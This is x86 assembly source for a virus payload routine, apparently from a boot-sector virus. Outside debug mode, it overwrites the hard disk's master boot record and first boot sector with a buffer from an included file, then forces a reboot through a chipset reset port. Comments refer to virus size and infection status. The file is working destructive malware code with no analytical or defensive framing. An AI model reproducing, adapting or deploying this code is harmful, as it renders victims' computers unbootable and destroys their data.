
;DEBUG                   equ     YES

;         ³   debug on        debug off
; ÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; target  ³   sect. 60        mbr       (cyl=0 head=0 sect=1)
;         ³   sect. 61        1st boot  (cyl=0 head=1 sect=1)
;         ³
;
;

;ID_PORT                 equ     80h
;ID_KEY                  equ     88h

RESET_PORT              equ     0CFEh   ; PCI chipset only
RESET_KEY               equ     0

;COUNT_PORT              equ     84h
;MAX_COUNT               equ     10

                        .386
                        .model  flat

                        .code

extrn                   __Write_13:PROC

public                  _decode

_decode:

                        nop

                IFDEF   DEBUG
                        int 3
                ELSE
                        nop
                ENDIF

                        pushad

                        call    entry
entry:                  pop     ebp
                        sub     ebp, offset entry

                    ;   in      al, ID_PORT
                    ;   cmp     al, ID_KEY
                    ;   je      @@1

                        lea     eax, fuckup[ebp]
                        push    eax
                        push    1             ; sectcount
                IFDEF   DEBUG
                        push    0             ; DH
                        push    60   ; 60=3Ch
                ELSE
                        push    0             ; DH
                        push    1             ; CX
                ENDIF
                        push    80h           ; DL
                        push    0             ; FUCK FUCK FUCK FUCK
                        lea     eax, offset __Write_13
                        call    eax
                        add     esp, 4*6

                        lea     eax, fuckup[ebp]
                        push    eax
                        push    1             ; sectcount
                IFDEF   DEBUG
                        push    0             ; DH
                        push    61   ; 61=3Dh
                ELSE
                        push    1             ; DH
                        push    1             ; CX
                ENDIF
                        push    80h           ; DL
                        push    0             ; FUCK FUCK FUCK FUCK
                        lea     eax, offset __Write_13
                IFDEF   DEBUG
                        nop
                        nop
                ELSE
                        call    eax
                ENDIF
                        add     esp, 4*6
                   ;    mov     al, ID_KEY
                   ;    out     ID_PORT, al
                   ;
                   ;    mov     al, 0
                   ;    out     COUNT_PORT, al

@@1:                    nop
                        nop

                    ;   in      al, COUNT_PORT
                    ;   inc     al
                    ;   out     COUNT_PORT, al
                    ;   cmp     al, MAX_COUNT
                    ;   jb      __z

                        mov     dx, RESET_PORT
                        mov     al, RESET_KEY
                        out     dx, al

__z:                    nop
                        nop

                        popad

                        xor     ax, ax   ; 0=not infected, 1=infected

                        retn

include                 fuckup.inc

                     ;  db      4096-1024 dup (0CCh)

virsize                 equ     $-_decode

                        end     _decode

